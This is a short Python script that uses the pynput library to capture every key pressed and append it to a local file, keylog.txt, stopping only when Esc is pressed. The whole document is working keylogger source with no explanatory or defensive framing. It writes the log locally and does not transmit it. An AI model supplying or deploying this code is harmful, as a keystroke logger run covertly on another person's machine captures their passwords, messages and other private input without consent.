from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{str(key)}")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
